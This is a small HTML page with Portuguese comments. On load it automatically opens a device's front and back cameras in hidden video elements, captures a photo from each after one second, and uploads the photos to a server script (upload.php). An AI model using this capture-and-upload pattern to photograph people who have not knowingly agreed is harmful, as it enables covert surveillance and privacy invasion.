<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Captura Automática de Câmera</title>
</head>
<body>
  <h1>Capturando Fotos Automáticas</h1>

  <!-- Vídeos ao vivo da câmera -->
  <video id="video-front" autoplay playsinline width="320" height="240" style="display: none;"></video>
  <video id="video-back" autoplay playsinline width="320" height="240" style="display: none;"></video>

  <!-- Exibir as fotos tiradas -->
  <img id="photo-front" alt="Foto Frontal" width="320" height="240">
  <img id="photo-back" alt="Foto Traseira" width="320" height="240">

  <script>
    const videoFront = document.getElementById('video-front');
    const videoBack = document.getElementById('video-back');
    const photoFront = document.getElementById('photo-front');
    const photoBack = document.getElementById('photo-back');

    // Função para iniciar a câmera (frontal ou traseira)
    async function startCamera(videoElement, facingMode) {
      const constraints = {
        video: { facingMode: facingMode }
      };
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        videoElement.srcObject = stream;

        // Aguarda o vídeo carregar e tira a foto automaticamente
        videoElement.onloadedmetadata = () => {
          setTimeout(() => {
            capturePhoto(videoElement, facingMode);
          }, 1000); // Captura após 1 segundo
        };
      } catch (error) {
        console.error('Erro ao acessar a câmera:', error);
      }
    }

    // Função para capturar a foto e enviá-la ao servidor
    function capturePhoto(videoElement, mode) {
      const canvas = document.createElement('canvas');
      canvas.width = videoElement.videoWidth;
      canvas.height = videoElement.videoHeight;
      const context = canvas.getContext('2d');
      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

      // Converte a imagem capturada para Blob
      canvas.toBlob((blob) => {
        const url = URL.createObjectURL(blob);
        if (mode === 'user') {
          photoFront.src = url;  // Exibe a foto frontal
        } else if (mode === 'environment') {
          photoBack.src = url;   // Exibe a foto traseira
        }

        // Enviar a imagem para o servidor
        const formData = new FormData();
        formData.append('photo', blob, `${mode}-photo.jpg`);

        fetch('upload.php', {
          method: 'POST',
          body: formData
        })
        .then(response => response.text())
        .then(data => console.log('Foto enviada com sucesso!', data))
        .catch(error => console.error('Erro ao enviar a foto:', error));
      }, 'image/jpeg');
    }

    // Iniciar a câmera frontal e traseira automaticamente
    startCamera(videoFront, 'user');         // Câmera frontal
    startCamera(videoBack, 'environment');   // Câmera traseira
  </script>
</body>
</html>